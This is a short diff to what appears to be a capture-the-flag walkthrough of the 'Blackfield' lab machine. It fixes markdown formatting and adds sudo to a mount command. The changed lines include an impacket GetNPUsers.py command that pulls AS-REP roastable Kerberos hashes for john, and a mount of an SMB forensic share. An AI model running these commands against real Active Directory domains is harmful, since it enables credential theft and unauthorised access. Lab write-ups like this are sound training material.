@@ -426,7 +426,7 @@ ZWausik
 
 > **since now we have a list of users,so we can use GetNPuser from impacket to generate a TGT for any valid user.**
 
-> **python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py BLACKFIELD.LOCAL/ -usersfile users.txt -format john -outputfile TGT -dc-ip 10.10.10.192
+> **python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py BLACKFIELD.LOCAL/ -usersfile users.txt -format john -outputfile TGT -dc-ip 10.10.10.192**
 
 ![](https://i.ibb.co/9qLqHFV/tgt.png)
 
@@ -527,7 +527,7 @@ smb: \>
 
 * we can use cifs.utility to mount this share.
 
-> **mount -t cifs //10.10.10.192/forensic /mnt/forensic -o user=audit2020**
+> **sudo mount -t cifs //10.10.10.192/forensic /mnt/forensic -o user=audit2020**
 
 ![](https://i.ibb.co/0KDBhjQ/forensics.png)
 
